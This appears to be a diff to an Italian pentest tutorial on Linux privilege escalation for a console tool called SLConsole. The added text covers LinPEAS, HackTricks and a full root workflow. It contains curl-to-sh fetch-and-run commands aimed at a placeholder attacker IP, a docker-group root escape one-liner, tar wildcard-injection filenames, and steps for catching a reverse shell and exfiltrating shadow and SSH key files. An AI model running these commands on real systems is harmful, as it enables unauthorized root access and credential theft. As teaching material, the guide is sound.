@@ -1,6 +1,6 @@
 # Privilege Escalation — Linux
 
-Come passare da utente normale a root su una target Linux: i primi comandi da lanciare, i vettori più comuni (SUID, cronjob, sudo) e dove trovare i payload pronti.
+Come passare da utente normale a root su una target Linux: i primi comandi da lanciare, i vettori più comuni (SUID, cronjob, sudo), l'enumerazione automatica con LinPEAS e dove trovare i payload pronti.
 
 ---
 
@@ -63,10 +63,9 @@ Vettori tipici:
 2. **PATH hijacking** — lo script chiama un comando senza path assoluto (es. `tar` invece di `/bin/tar`) e la directory del cron è scrivibile: crei un `tar` malevolo tuo.
 3. **Wildcard injection** — il cron usa `tar cf backup.tar *`: crei file chiamati `--checkpoint=1` e `--checkpoint-action=exec=sh shell.sh` nella directory archiviata.
 
-Per capire cosa gira anche se non è in `/etc/crontab`, osserva i processi in tempo reale:
+Per capire cosa gira anche se non è in `/etc/crontab`, osserva i processi in tempo reale con **pspy** (già nel catalogo di `serve fetch`):
 
 ```bash
-# se pspy è presente (o caricalo tu con 'serve'):
 ./pspy64
 ```
 
@@ -86,6 +85,38 @@ Anche `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` sono privesc immediati.
 
 ---
 
+## LinPEAS — enumerazione automatica
+
+**LinPEAS** (suite [PEASS-ng](https://github.com/peass-ng/PEASS-ng)) automatizza tutta l'enumerazione vista sopra e molto di più: SUID, cronjob, sudoers, capabilities, credenziali in chiaro nei file di config, NFS, versioni kernel vulnerabili, docker e altro.
+
+SLConsole la integra in due modi:
+
+```bash
+install linpeas     # scarica linpeas.sh + binario statico in locale e in static/
+serve fetch         # in alternativa: scarica tutto il kit post-exploitation
+                    # (linpeas, pspy, linenum, linux-exploit-suggester, winpeas)
+```
+
+Sulla target (consegna in memoria, niente file su disco):
+
+```bash
+curl http://TUO_IP:2727/linpeas.sh | sh
+```
+
+Leggere l'output: **rosso/giallo** = quasi sicuramente sfruttabile, **rosso** = da controllare. Opzioni utili: `-a` (check profondi), `-s` (superfast), `-q` (stealth).
+
+---
+
+## Altri vettori da non dimenticare
+
+- **Gruppi speciali** — se sei in `docker`, `lxd` o `adm`: docker → `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`; lxd → container privilegiato con mount della root; adm → leggi i log (password digitate, segreti)
+- **Capabilities** — `getcap -r / 2>/dev/null`: `cap_setuid`, `cap_dac_read_search` su python/perl/tar equivalgono a root
+- **NFS no_root_squash** — `cat /etc/exports`: se una share è montabile con `no_root_squash`, carichi un binario SUID da client
+- **Kernel exploit** — `uname -a` + `linux-exploit-suggester.sh` (già nel catalogo `serve fetch`): ultima spiaggia, rischioso su target reali
+- **Credenziali riusate** — password trovate in config/history spesso valgono per sudo o per altri utenti
+
+---
+
 ## GTFOBins — i payload pronti
 
 **[GTFOBins](https://gtfobins.org)** è la bibbia: per ogni binario Unix elenca i one-liner per abusarne — shell, reverse shell, SUID, sudo, file read/write, capabilities. È la fonte anche per **script one-liner di revshell** (`bash`, `nc`, `python`, `perl`, `ruby`, `php`…).
@@ -95,7 +126,7 @@ In SLConsole è disponibile **offline**: si scarica una copia locale e si interr
 ```bash
 install gtfobins        # scarica il database GTFOBins in locale (una tantum)
 gtfobins find           # tutte le funzioni note per 'find'
-gtfobins find suid      # solo il payload SUID
+gtfobins find suid      # solo i payload validi col bit SUID
 gtfobins bash reverse-shell
 gtfobins search vim     # cerca binari per nome
 gtfobins list           # tutti i binari nel database locale
@@ -103,6 +134,43 @@ gtfobins update         # aggiorna la copia locale
 ```
 
 Fonte ufficiale: <https://gtfobins.org> — curata da Emilio Pinna e Andrea Cardaci, repo: <https://github.com/GTFOBins/GTFOBins.github.io>
+
+---
+
+## HackTricks — la checklist di riferimento
+
+**[HackTricks](https://book.hacktricks.wiki/)** (di Carlos Polop, lo stesso autore di PEASS-ng) è l'altra fonte da tenere a portata: per il privesc Linux la pagina chiave è la **[Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)**.
+
+Utile quando LinPEAS segnala qualcosa ma non sai come sfruttarlo: ogni vettore (cron PATH, wildcard, capabilities, NFS, docker, sudo LD_PRELOAD…) ha una pagina dedicata con spiegazione e exploit passo-passo. GTFOBins ti dà il one-liner, HackTricks ti spiega il **perché** e i casi particolari.
+
+---
+
+## Workflow completo con SLConsole
+
+Dalla prima shell alla root, tutto dalla console:
+
+```bash
+# 1. Prepara il kit e il server di delivery
+serve fetch                 # scarica linpeas, pspy, linenum, exploit-suggester…
+serve on                    # HTTP su :2727
+
+# 2. Sulla target: enum automatica
+curl http://TUO_IP:2727/linpeas.sh | sh
+curl http://TUO_IP:2727/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy64  # cronjob nascosti
+
+# 3. Trovato un binario SUID/sudo interessante? Payload pronto offline:
+gtfobins <binario> suid
+gtfobins <binario> sudo
+
+# 4. Cronjob scrivibile? Listener pronto a ricevere la root shell:
+catch tcp on                # listener in background, poi aggiungi la revshell allo script
+
+# 5. Vuoi esfiltrare prove (shadow, id_rsa, flag)? La target le carica con curl:
+loot                        # i file arrivano in loot/ e li leggi con 'loot read'
+
+# 6. Enum manuale guidata (impara mentre fai):
+linseal -i                  # ogni comando spiegato riga per riga
+```
 
 ---
 
@@ -116,7 +184,6 @@ find / -perm -4000 -type f 2>/dev/null          # SUID
 find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)' | head  # file scrivibili
 ls -la /opt /tmp /var/tmp /dev/shm              # directory interessanti
 getcap -r / 2>/dev/null                         # capabilities (es. cap_setuid)
+cat /etc/exports                                # NFS no_root_squash
 env | grep -i pass; history                     # segreti dimenticati
 ```
-
-Per l'enumerazione guidata passo-passo usa anche `linseal -i` dalla console: spiega ogni comando mentre lo esegui a mano.
